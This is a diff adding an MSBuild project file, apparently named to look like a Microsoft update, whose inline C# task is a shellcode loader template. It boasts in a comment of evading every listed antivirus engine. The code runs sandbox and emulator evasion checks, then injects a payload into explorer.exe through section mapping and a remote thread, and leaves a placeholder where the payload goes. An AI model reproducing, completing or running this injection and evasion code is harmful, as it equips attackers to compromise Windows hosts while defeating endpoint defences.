@@ -1,0 +1,270 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\msbuild.exe MSUpdate.xml -->
+  <PropertyGroup>
+    <FunctionName Condition="'$(FunctionName)' == ''"></FunctionName>
+    <Cmd Condition="'$(Cmd)' == ''">None</Cmd>
+    <URL Condition="'$(URL)' == ''">%s</URL>
+    </PropertyGroup>
+  <Target Name="Run">
+   <TaskRun />
+  </Target>
+    <UsingTask
+    TaskName="TaskRun"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+      <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+                <![CDATA[
+
+/*
+Uses AES encryption, caesar shift, and XOR encoding for payload encryption. Performs process Injection against specified group of processes.
+Scan Ref: https://antiscan.me/scan/new/result?id=6UGO2wHxTkqf
+Scan Date: 05-06-2021 03:48:06
+Result List:
+Ad-Aware Antivirus: Clean
+AhnLab V3 Internet Security: Clean
+Alyac Internet Security: Clean
+Avast: Clean
+AVG: Clean
+Avira: Clean
+BitDefender: Clean
+BullGuard: Clean
+ClamAV: Clean
+Comodo Antivirus: Clean
+DrWeb: Clean
+Emsisoft: Clean
+Eset NOD32: Clean
+Fortinet: Clean
+F-Secure: Clean
+IKARUS: Clean
+Kaspersky: Clean
+McAfee: Clean
+Malwarebytes: Clean
+Panda Antivirus: Clean
+Sophos: Clean
+Trend Micro Internet Security: Clean
+Webroot SecureAnywhere: Clean
+Windows 10 Defender: Clean
+Zone Alarm: Clean
+Zillya: Clean
+*/
+
+using System;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Diagnostics;
+using System.Security.Cryptography;
+using System.Threading;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Net;
+
+namespace ProcessInjectionRunner
+{
+    public class SimpleAES
+    {
+        private AesCryptoServiceProvider _aes;
+        private ICryptoTransform _crypto;
+
+        public SimpleAES(string KEY, string IV)
+        {
+            _aes = new AesCryptoServiceProvider();
+            _aes.BlockSize = 128;
+            _aes.KeySize = 128;
+            _aes.Key = ASCIIEncoding.ASCII.GetBytes(KEY);
+            _aes.IV = ASCIIEncoding.ASCII.GetBytes(IV);
+            _aes.Padding = PaddingMode.PKCS7;
+            _aes.Mode = CipherMode.CBC;
+        }
+
+        public byte[] decrypt(string message)
+        {
+            _crypto = _aes.CreateDecryptor(_aes.Key, _aes.IV);
+            byte[] decrypted = _crypto.TransformFinalBlock(System.Convert.FromBase64String(message), 0, System.Convert.FromBase64String(message).Length);
+            _crypto.Dispose();
+            return decrypted;
+        }
+    }
+
+    public class TaskRun :  Task, ITask
+    {
+        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool IsWow64Process([In] IntPtr processHandle, [Out, MarshalAs(UnmanagedType.Bool)] out bool wow64Process);
+
+        public enum ProcessAccessFlags : uint
+        {
+            QueryInformation = 0x00000400,
+            QueryLimitedInformation = 0x1000
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECT_DATA
+        {
+            public Boolean isvalid;
+            public IntPtr hSection;
+            public IntPtr pBase;
+        }
+
+        [DllImport("kernel32")]
+         public static extern IntPtr LoadLibrary(string name);
+
+         [DllImport("kernel32")]
+         public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+         [DllImport("kernel32")]
+         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+         static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+         [DllImport("kernel32.dll")]
+         static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+         [DllImport("kernel32.dll")]
+         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+         [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
+         static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+
+         [DllImport("advapi32.dll", SetLastError = true)]
+         [return: MarshalAs(UnmanagedType.Bool)]
+         public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
+
+         // Copied from Rubeus
+         [DllImport("ntdll.dll")]
+         public static extern UInt32 NtCreateSection(ref IntPtr section, UInt32 desiredAccess, IntPtr pAttrs, ref long MaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);
+
+         // Copied from Rubeus
+         [DllImport("ntdll.dll")]
+         public static extern UInt32 NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, IntPtr SectionOffset, ref long ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
+
+         [DllImport("kernel32.dll", SetLastError = true)]
+         static extern bool CloseHandle(IntPtr hObject);
+
+         [DllImport("ntdll.dll", SetLastError = true)]
+         static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
+
+         [DllImport("ntdll.dll", SetLastError = true)]
+         private static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+         [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
+         static extern int NtClose(IntPtr hObject);
+
+         [DllImport("kernel32.dll")]
+         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+         [DllImport("kernel32.dll", SetLastError = true)]
+         public static extern IntPtr OpenProcess(UInt32 processAccess, bool bInheritHandle, int processId);
+
+         [DllImport("kernel32.dll")]
+         static extern void Sleep(uint dwMilliseconds);
+
+         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+         static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred); //Anti-AV emulator
+
+         [DllImport("kernel32.dll")]
+         static extern IntPtr FlsAlloc(IntPtr callback);
+
+         [DllImport("kernel32.dll")]
+         static extern uint GetTickCount();
+
+         [DllImport("kernel32.dll")]
+         static extern IntPtr GetCurrentProcess();
+
+        public override bool Execute()
+        {
+            Console.WriteLine("[+] Validating Environment...");
+
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (t2 < 1.5)
+            {
+                return false;
+            }
+            Console.WriteLine("\t|_Date Time: " + t2);
+
+            IntPtr VirtualAllocExNumaMem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+
+            if (VirtualAllocExNumaMem == null)
+            {
+                return false;
+            }
+            Console.WriteLine("\t|_VirtualAllocExNumaMem: " + VirtualAllocExNumaMem);
+
+            IntPtr FlsAllocMem = FlsAlloc(IntPtr.Zero);
+            if (FlsAllocMem == null)
+            {
+                return false;
+            }
+            Console.WriteLine("\t|_FlsAlloc: " + FlsAlloc(IntPtr.Zero));
+
+            if (GetTickCount() < 60000)
+            {
+                return false;
+            }
+            Console.WriteLine("\t|_GetTickCount: " + GetTickCount());
+
+            int manyrun = 0;
+            for (int z = 0; z < 100000000; z++)
+            {
+                manyrun++;
+            }
+            Console.WriteLine("\t|_LoopCheck: " + manyrun);
+            if (manyrun == 100000000)
+            {
+                    try
+                    {
+                        var fakeKey = new WebClient().DownloadString("http://ioashndoiasnddhaposdmawpidnaspidmwneionioasndoiasndpspodmadmasaadhjpoadelnbjkbnsa=asdasnmdpasjdpasdnfnpfnouahd/key.txt");
+                    }
+                    catch(Exception e)
+                    {
+                        {{{PayloadMethod}}}
+
+                        Process[] remoteProc = Process.GetProcessesByName("explorer");
+                        IntPtr hSection = IntPtr.Zero;
+                        Process localProcess = Process.GetCurrentProcess();
+                        IntPtr hOpenProcRemote = OpenProcess(0x001F0FFF, false, remoteProc[0].Id);
+
+                        long size = buf.Length;
+                        uint SectionHandle = NtCreateSection(ref hSection, 0x10000000, IntPtr.Zero, ref size, 0x40, 0x8000000, IntPtr.Zero);
+                        Console.WriteLine("\n[+] NtCreateSection");
+                        Console.WriteLine("\t|_Status Code: 0x" + Convert.ToString(SectionHandle, 16));
+
+                        IntPtr remoteAddr = IntPtr.Zero;
+                        uint NtRemoteView = NtMapViewOfSection(hSection, hOpenProcRemote, ref remoteAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref size, 1, 0, 0x40);
+                        Console.WriteLine("\n[+] Remote NtMapViewOfSection");
+                        Console.WriteLine("\t|_Status Code: 0x" + Convert.ToString(NtRemoteView, 16));
+                        Console.WriteLine("\t|_remote.Addr: " + remoteAddr);
+
+                        IntPtr outSize = IntPtr.Zero;
+                        NtWriteVirtualMemory(hOpenProcRemote, remoteAddr, buf, buf.Length, out outSize);
+
+                        DateTime t3 = DateTime.Now;
+                        Sleep(2000);
+                        double t4 = DateTime.Now.Subtract(t3).TotalSeconds;
+                        if (t4 < 1.5)
+                        {
+                            //Windows Defender catches
+                            return false;
+                        }
+
+                        IntPtr hThread = CreateRemoteThread(hOpenProcRemote, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, IntPtr.Zero);
+                        CloseHandle(hThread);
+                        return false;
+                }
+                return false;
+            }
+            return false;
+        }
+    }
+}
+]]>
+</Code>
+</Task>
+</UsingTask>
+</Project>
